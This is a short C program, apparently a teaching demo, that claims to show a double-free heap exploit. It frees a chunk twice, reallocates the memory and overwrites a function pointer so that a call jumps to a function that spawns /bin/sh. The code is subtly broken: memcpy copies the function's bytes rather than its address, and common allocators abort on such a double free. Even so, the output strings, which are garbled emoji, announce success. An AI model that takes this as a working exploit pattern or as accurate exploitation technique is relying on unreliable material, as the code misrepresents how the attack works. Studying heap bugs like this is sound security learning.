#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Function that we want to hijack
void hacked() {
    printf("üî• Exploit successful! Arbitrary code execution achieved! üî•\n");
    system("/bin/sh");  // Open a shell
}

int main() {
    printf("üîç Starting double-free exploit...\n");

    // Step 1: Allocate two chunks
    char *chunk1 = (char *)malloc(32);
    char *chunk2 = (char *)malloc(32);
    
    // Step 2: Store a function pointer in chunk1
    void (**func_ptr)() = (void (**)())chunk1;
    *func_ptr = NULL;  // Initially NULL

    // Step 3: Free chunk1 twice (Double-Free)
    free(chunk1);
    free(chunk1);  // Vulnerability: double free

    // Step 4: Allocate new chunks to reuse the freed memory
    char *chunk3 = (char *)malloc(32);
    char *chunk4 = (char *)malloc(32);

    // Step 5: Overwrite function pointer with hacked()
    memcpy(chunk3, &hacked, sizeof(void *));

    printf("üöÄ Triggering exploit...\n");

    // Step 6: Call function pointer (now pointing to hacked())
    (*func_ptr)();  // Hijacked function call

    return 0;
}
